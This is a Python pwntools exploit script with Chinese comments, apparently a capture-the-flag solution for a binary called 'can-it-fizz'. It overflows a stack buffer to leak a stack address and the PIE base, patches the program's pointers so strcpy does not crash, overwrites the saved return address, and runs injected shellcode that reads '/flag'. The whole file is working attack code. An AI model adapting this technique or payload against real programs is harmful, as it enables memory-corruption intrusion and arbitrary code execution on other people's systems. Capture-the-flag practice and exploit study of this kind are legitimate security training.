#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"


def exploit():
    p = process("/challenge/can-it-fizz")

    # 推进到第 5 次循环 (var_14h == 5) 以触发 Buzz
    # 此时 src 将被指向 buf+0x44
    for i in range(6):
        p.recvuntil(f"{i}: ".encode())
        if i < 5:
            p.send(b"A")

    # 56 bytes padding + 覆盖 var_14h 为 -1 (\xff\xff\xff\xff)
    # 这样没有 null byte 截断，printf 会一直打印出后面的 src 指针
    # 同时 -1 + 1 = 0，0 < 16，循环会继续，不会退出。
    payload_leak_stack = b"A" * 56 + b"\xff\xff\xff\xff"
    p.send(payload_leak_stack)

    p.recvuntil(b"You entered: " + payload_leak_stack)
    stack_leak = u64(p.recv(6).ljust(8, b"\x00"))

    buf_addr = stack_leak - 0x44
    rbp_addr = buf_addr + 0x60
    log.info(f"[+] Stack Leaked! buf address: {hex(buf_addr)}")

    # 此时 var_14h 变回 0，触发 FizzBuzz，src 指向只读数据段 (PIE)
    p.recvuntil(b"0: ")

    payload_leak_pie = b"A" * 56 + b"\xff\xff\xff\xff"
    p.send(payload_leak_pie)

    p.recvuntil(b"You entered: " + payload_leak_pie)
    pie_leak = u64(p.recv(6).ljust(8, b"\x00"))
    pie_base = pie_leak - 0x4018
    log.info(f"[+] PIE Leaked! base address: {hex(pie_base)}")

    p.recvuntil(b"0: ")

    dest_addr = rbp_addr - 0x200  # 在栈上找个安全区让 strcpy 复制
    src_addr = pie_base + 0x4018  # 填入一个合法的只读地址，防止 strcpy 触发 SIGSEGV
    shellcode_addr = rbp_addr + 16  # ret 之后的地址

    # 构造完美内存布局
    payload = flat(
        {
            0: b"A" * 56,
            56: p32(16),  # var_14h 设为 16，循环自增变 17
            60: p64(src_addr),  # 修复 src
            68: p64(dest_addr),  # 修复 dest
            76: p64(rbp_addr),  # 填入原始 rbp
            84: p64(shellcode_addr),  # 劫持 ret
            92: asm(shellcraft.cat("/flag")),
        }
    )

    p.send(payload)
    p.interactive()


if __name__ == "__main__":
    exploit()
